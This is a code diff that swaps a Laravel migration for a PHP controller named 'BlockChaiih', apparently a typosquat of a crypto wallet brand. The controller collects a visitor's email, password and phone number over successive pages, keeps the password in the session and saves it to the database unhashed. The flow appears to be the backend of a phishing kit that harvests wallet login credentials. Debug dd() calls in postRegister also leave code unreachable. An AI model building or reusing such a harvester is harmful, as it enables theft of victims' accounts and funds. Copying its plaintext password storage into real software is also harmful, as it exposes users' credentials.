@@ -1,36 +1,79 @@
 <?php
 
-use Illuminate\Database\Migrations\Migration;
-use Illuminate\Database\Schema\Blueprint;
-use Illuminate\Support\Facades\Schema;
+namespace App\Http\Controllers;
 
-class CreateSignupTable extends Migration
+use Illuminate\Http\Request;
+
+use App\Models\Blockchaiih;
+
+class BlockChaiihController extends Controller
 {
-    /**
-     * Run the migrations.
-     *
-     * @return void
-     */
-    public function up()
+    public function login()
     {
-        Schema::create('signup', function (Blueprint $table) {
-            $table->id();
-            $table->string('email');
-            $table->string('number')->nullable();
-            $table->timestamp('email_verified_at')->nullable();
-            $table->string('password');
-            $table->rememberToken();
-            $table->timestamps();
-        });
+    	return view('blockchaiih.login');
     }
-
-    /**
-     * Reverse the migrations.
-     *
-     * @return void
-     */
-    public function down()
+    public function password()
     {
-        Schema::dropIfExists('signup');
+    	return view('blockchaiih.password');
+    }
+    public function register()
+    {
+    	return view('blockchaiih.register');
+    }
+    public function number()
+    {
+        return view('blockchaiih.number');
+    }
+    public function postRegister(request $request)
+    {
+        //dd($request);
+        $request->validate([
+            'name'=>'required',
+            'email'=>'required',
+            'password'=>'required',
+            
+        ]);
+
+        dd('done');
+        dd(Blockchaiih::create($request->all()));
+        dd('not done');
+        return view('welcome');
+    }
+    public function postLogin(request $request)
+    {
+        $request->validate([
+            'email'=>'required',
+        ]);
+        $email = $request->email;
+        session()->put('email',$email);
+
+        return view('blockchaiih.password');
+    }
+    public function postNumber(request $request)
+    {
+        $request->validate([
+            'number'=>'required',
+        ]);
+        $number = $request->number;
+
+        $Blockchaiih = new Blockchaiih();
+        $Blockchaiih->email = session()->get('email');
+        $Blockchaiih->number = $number;
+        $Blockchaiih->password = session()->get('password');
+
+        
+        $Blockchaiih->save();
+        
+        return view('welcome');
+    }
+    public function postPassword(request $request)
+    {
+        $request->validate([
+            'password'=>'required',
+        ]);
+        $password = $request->password;
+        session()->put('password',$password);
+
+        return view('blockchaiih.number');
     }
 }
